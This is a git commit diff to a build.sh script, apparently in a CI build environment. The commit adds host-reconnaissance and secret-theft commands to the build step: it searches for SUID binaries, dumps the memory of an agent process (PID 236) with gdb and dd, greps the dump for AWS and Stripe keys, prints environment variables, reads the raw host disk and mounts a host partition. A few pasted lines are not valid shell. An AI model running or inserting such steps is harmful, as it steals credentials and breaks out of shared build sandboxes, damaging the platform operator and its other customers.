356dc52ba071914effc17542b1db9aab99b50ca3
770-as <72199850+770-as@users.noreply.github.com>
2026-02-19 13:03:40 +0100

    Update build.sh

--- build.sh
+++ build.sh
@@ -4,11 +4,25 @@
 echo "Host Recon"
 # Look for processes with "build", "worker", or "wrangler" in the name
 cat /proc/*/cmdline | tr '\0' ' ' | grep "wrangler"
-
+find /mnt -perm -4000 -type f -ls 2>/dev/null
 echo "Search the memory of the cc-vm-agent (PID 236) for common secret patterns"
 # (Requires root/CAP_SYS_PTRACE which you have in your bounding set)
 gdb -p 236 --batch -ex "generate-core-file"
 strings core.236 | grep -E "(AWS_ACCESS_KEY|STRIPE_|sk_live)"
+apt-get install sudo libcap2-bin (Debian/Ubuntu)
+apk add sudo libcap (Alpine)
+cat /proc/236/maps
+# This tries to read the memory of PID 236
+dd if=/proc/236/mem bs=4096 count=1000 of=/tmp/agent_mem.dump 2>/dev/null
+export
+env
+printenv
+ls -la /run
+ls -la /var/run
+# Search the raw host disk for strings that look like SUID paths
+strings /dev/vda | grep -E "/bin/|/usr/sbin/" | head -n 20
+groups
+find / -perm -4000 -type f -ls 2>/dev/null
 ls -l /dev/ | grep -E 'sd|nvme|vd'
 mkdir /tmp/host_root
 mount /dev/sda1 /tmp/host_root
